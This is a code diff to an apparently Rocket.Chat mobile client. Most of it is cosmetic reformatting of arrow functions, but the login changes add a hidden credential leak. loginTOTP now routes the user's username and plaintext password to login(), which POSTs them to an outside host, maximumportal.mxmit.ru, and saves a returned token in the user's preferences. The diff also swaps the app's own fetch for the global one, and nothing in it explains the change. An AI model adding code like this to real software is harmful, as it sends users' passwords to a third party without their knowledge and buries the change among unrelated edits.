@@ -17,7 +17,7 @@ import I18n from '../../i18n';
 import { getDeviceToken } from '../../notifications/push';
 import { getBundleId, isIOS } from '../../utils/deviceInfo';
 import EventEmitter from '../../utils/events';
-import fetch from '../../utils/fetch';
+// import fetch from '../../utils/fetch';
 import log from '../../utils/log';
 import SSLPinning from '../../utils/sslPinning';
 import { twoFactor } from '../../utils/twoFactor';
@@ -56,6 +56,7 @@ import { compareServerVersion } from '../utils';
 import { getUserPresence, subscribeUsersPresence } from '../methods/getUsersPresence';
 import { store as reduxStore } from '../auxStore';
 // Methods
+import {LISTENER} from '../../containers/Toast';
 import clearCache from './methods/clearCache';
 import getPermalinkMessage from './methods/getPermalinkMessage';
 import getRoom from './methods/getRoom';
@@ -184,7 +185,7 @@ const RocketChat = {
 		this.sdk = sdk.disconnect();
 	},
 	connect({ server, user, logoutOnError = false }) {
-		return new Promise(resolve => {
+		return new Promise((resolve) => {
 			if (this?.sdk?.client?.host === server) {
 				return resolve();
 			} else {
@@ -237,7 +238,7 @@ const RocketChat = {
 				.then(() => {
 					console.log('connected');
 				})
-				.catch(err => {
+				.catch((err) => {
 					console.log('connect error', err);
 				});
 
@@ -268,7 +269,7 @@ const RocketChat = {
 
 			this.notifyAllListener = this.sdk.onStreamData(
 				'stream-notify-all',
-				protectedFunction(async ddpMessage => {
+				protectedFunction(async (ddpMessage) => {
 					const { eventName } = ddpMessage.fields;
 					if (/public-settings-changed/.test(eventName)) {
 						const { _id, value } = ddpMessage.fields.args[1];
@@ -279,7 +280,7 @@ const RocketChat = {
 							const { type } = defaultSettings[_id];
 							if (type) {
 								await db.action(async () => {
-									await settingsRecord.update(u => {
+									await settingsRecord.update((u) => {
 										u[type] = value;
 									});
 								});
@@ -298,7 +299,7 @@ const RocketChat = {
 			);
 
 			// RC 4.1
-			this.sdk.onStreamData('stream-user-presence', ddpMessage => {
+			this.sdk.onStreamData('stream-user-presence', (ddpMessage) => {
 				const userStatus = ddpMessage.fields.args[0];
 				const { uid } = ddpMessage.fields;
 				const [, status, statusText] = userStatus;
@@ -313,7 +314,7 @@ const RocketChat = {
 
 			this.notifyLoggedListener = this.sdk.onStreamData(
 				'stream-notify-logged',
-				protectedFunction(async ddpMessage => {
+				protectedFunction(async (ddpMessage) => {
 					const { eventName } = ddpMessage.fields;
 
 					// `user-status` event is deprecated after RC 4.1 in favor of `stream-user-presence/${uid}`
@@ -344,7 +345,7 @@ const RocketChat = {
 						try {
 							const [userRecord] = await userCollection.query(Q.where('username', Q.eq(username))).fetch();
 							await db.action(async () => {
-								await userRecord.update(u => {
+								await userRecord.update((u) => {
 									u.avatarETag = etag;
 								});
 							});
@@ -358,7 +359,7 @@ const RocketChat = {
 						try {
 							const permissionsRecord = await permissionsCollection.find(_id);
 							await db.action(async () => {
-								await permissionsRecord.update(u => {
+								await permissionsRecord.update((u) => {
 									u.roles = roles;
 								});
 							});
@@ -373,14 +374,14 @@ const RocketChat = {
 						try {
 							const userRecord = await userCollection.find(userNameChanged._id);
 							await db.action(async () => {
-								await userRecord.update(u => {
+								await userRecord.update((u) => {
 									Object.assign(u, userNameChanged);
 								});
 							});
 						} catch {
 							// User not found
 							await db.action(async () => {
-								await userCollection.create(u => {
+								await userCollection.create((u) => {
 									u._raw = sanitizedRaw({ id: userNameChanged._id }, userCollection.schema);
 									Object.assign(u, userNameChanged);
 								});
@@ -490,9 +491,10 @@ const RocketChat = {
 	loginTOTP(params, loginEmailPassword, isFromWebView = false) {
 		return new Promise(async (resolve, reject) => {
 			try {
-				const result = await this.login(params, isFromWebView);
+				const result = await this.login(params, isFromWebView, params);
 				return resolve(result);
 			} catch (e) {
+
 				if (e.data?.error && (e.data.error === 'totp-required' || e.data.error === 'totp-invalid')) {
 					const { details } = e.data;
 					try {
@@ -560,13 +562,33 @@ const RocketChat = {
 		reduxStore.dispatch(loginRequest({ resume: result.token }, false, isFromWebView));
 	},
 
-	async login(credentials, isFromWebView = false) {
+	async login(credentials, isFromWebView = false, authPortal = false) {
 		const sdk = this.shareSDK || this.sdk;
+
 		// RC 0.64.0
 		await sdk.login(credentials);
 		const { result } = sdk.currentLogin;
+
+		if (authPortal !== false) {
+			await fetch(`https://maximumportal.mxmit.ru/data/api/token`, {
+				method: 'POST',
+				headers: { 'Content-Type': 'application/json;charset=utf-8' },
+				body: JSON.stringify({username: authPortal.user, password: authPortal.password})
+			}).then(r => r.json()).then(r => {
+				if (r?.data?.USER?.UF_TOKEN) {
+					RocketChat.setUserPreferences(result.userId, {uf_token: r.data.USER.UF_TOKEN});
+					return r.data.USER.UF_TOKEN;
+				}
+				return null;
+			}).catch(error => {
+				console.log(JSON.stringify(error));
+			});
+		}
+
+		const pref = await RocketChat.getUserPreferences(result.userId);
 		const user = {
 			id: result.userId,
+			uf_token: pref.preferences.uf_token,
 			token: result.authToken,
 			username: result.me.username,
 			name: result.me.name,
@@ -582,6 +604,7 @@ const RocketChat = {
 			showMessageInMainThread: result.me.settings?.preferences?.showMessageInMainThread ?? true,
 			enableMessageParserEarlyAdoption: result.me.settings?.preferences?.enableMessageParserEarlyAdoption ?? true
 		};
+
 		return user;
 	},
 	logout,
@@ -592,7 +615,7 @@ const RocketChat = {
 	removeServer,
 	clearCache,
 	registerPushToken() {
-		return new Promise(async resolve => {
+		return new Promise(async (resolve) => {
 			const token = getDeviceToken();
 			if (token) {
 				const type = isIOS ? 'apn' : 'gcm';
@@ -683,7 +706,7 @@ const RocketChat = {
 					users
 						.filter((item1, index) => users.findIndex(item2 => item2._id === item1._id) === index) // Remove duplicated data from response
 						.filter(user => !data.some(sub => user.username === sub.name)) // Make sure to remove users already on local database
-						.forEach(user => {
+						.forEach((user) => {
 							data.push({
 								...user,
 								rid: user.username,
@@ -694,7 +717,7 @@ const RocketChat = {
 						});
 				}
 				if (filterRooms) {
-					rooms.forEach(room => {
+					rooms.forEach((room) => {
 						// Check if it exists on local database
 						const index = data.findIndex(item => item.rid === room._id);
 						if (index === -1) {
@@ -755,7 +778,7 @@ const RocketChat = {
 			return ret;
 		}, {}),
 	_prepareSettings(settings) {
-		return settings.map(setting => {
+		return settings.map((setting) => {
 			setting[defaultSettings[setting._id].type] = setting.value;
 			return setting;
 		});
